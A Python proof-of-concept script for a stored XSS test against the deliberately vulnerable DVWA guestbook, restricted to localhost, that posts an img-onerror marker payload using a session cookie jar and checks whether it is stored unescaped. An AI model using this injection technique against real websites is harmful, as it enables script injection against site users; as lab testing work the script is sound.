#!/usr/bin/env python3
# XSS-005 draft POC: DVWA guestbook stored XSS, write + independent re-read.
# Harmless marker only; browser execution of the marker is a separate manual step.
# Accepts only http(s) on localhost/127.0.0.1/::1 and never follows redirects.
import argparse
import http.cookiejar as cookiejar
import json
import re
import sys
from urllib.parse import urlparse

import requests

PAYLOAD = """<img src=x onerror="console.log('LLM_LAB_XSS')">"""
NAME = 'LLM_XSS5'
ROW_RE = re.compile(r'Name: (.*?)<br />Message: (.*?)<br />', re.S)
ALLOWED = ('127.0.0.1', 'localhost', '::1')


def local_only(url):
    u = urlparse(url)
    if u.scheme not in ('http', 'https') or u.hostname not in ALLOWED:
        sys.exit('refused: only http(s) on localhost/127.0.0.1/::1, got %r' % url)


def rows(html):
    return ROW_RE.findall(html)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base-url', required=True, help='e.g. http://127.0.0.1/dvwa')
    ap.add_argument('--cookie-jar', required=True, help='Netscape cookies.txt from a logged-in browser session (PHPSESSID + security=low)')
    ap.add_argument('--page-path', default='/vulnerabilities/xss_s/index.php')
    ap.add_argument('--timeout', type=float, default=10.0)
    ap.add_argument('--report', default='xss005_report.json')
    a = ap.parse_args()
    local_only(a.base_url)
    url = a.base_url.rstrip('/') + a.page_path
    local_only(url)
    if len(PAYLOAD) > 50:
        sys.exit('payload longer than the client maxlength=50 of mtxMessage')

    jar = cookiejar.MozillaCookieJar(a.cookie_jar)
    jar.load(ignore_discard=True, ignore_expires=True)
    s = requests.Session()
    s.cookies = requests.cookies.RequestsCookieJar()
    for c in jar:
        s.cookies.set_cookie(c)
    level = s.cookies.get('security')
    if level is None:
        sys.exit('precondition failed: cookie jar has no security cookie; XSS-005-D would fall back to default_security_level or impossible')
    rep = {'page_url': url, 'security_cookie': level, 'payload': PAYLOAD, 'payload_len': len(PAYLOAD), 'steps': {}}

    r = s.get(url, timeout=a.timeout, allow_redirects=False)
    rep['steps']['write_page_status'] = r.status_code
    if r.status_code in (301, 302, 303, 307, 308):
        sys.exit('precondition failed: %s -> %s; no authenticated session (auth failure, not an encoding result)' % (r.status_code, r.headers.get('Location')))
    if r.status_code != 200 or 'name="mtxMessage"' not in r.text:
        sys.exit('precondition failed: guestbook form not found (status %s)' % r.status_code)
    before = [m for _n, m in rows(r.text)]
    rep['steps']['baseline_messages'] = before
    rep['steps']['baseline_rows'] = len(before)

    w = s.post(url, data={'txtName': NAME, 'mtxMessage': PAYLOAD, 'btnSign': 'Sign Guestbook'}, timeout=a.timeout, allow_redirects=False)
    rep['steps']['write_status'] = w.status_code
    rep['steps']['write_response_raw_exact'] = any(m == PAYLOAD for _n, m in rows(w.text))

    g = s.get(url, timeout=a.timeout, allow_redirects=False)
    rep['steps']['reread_status'] = g.status_code
    after = rows(g.text)
    rep['steps']['reread_rows'] = len(after)
    rep['steps']['reread_raw_exact'] = any(m == PAYLOAD for _n, m in after)
    rep['steps']['reread_escaped_present'] = '&lt;img src=x onerror=' in g.text
    rep['steps']['new_rows'] = len(after) - len(before)
    print(json.dumps(rep, indent=2, ensure_ascii=False))
    with open(a.report, 'w', encoding='utf-8') as fh:
        json.dump(rep, fh, indent=2, ensure_ascii=False)
    ok = rep['steps']['reread_raw_exact'] and rep['steps']['new_rows'] == 1
    print('stored raw payload observed' if ok else 'raw payload NOT observed')
    print('cleanup (manual): DELETE FROM guestbook WHERE name = \'LLM_XSS5\'; on the lab DB, then re-run to confirm baseline rows; never btnClear/TRUNCATE.')
    return 0 if ok else 2


if __name__ == '__main__':
    sys.exit(main())
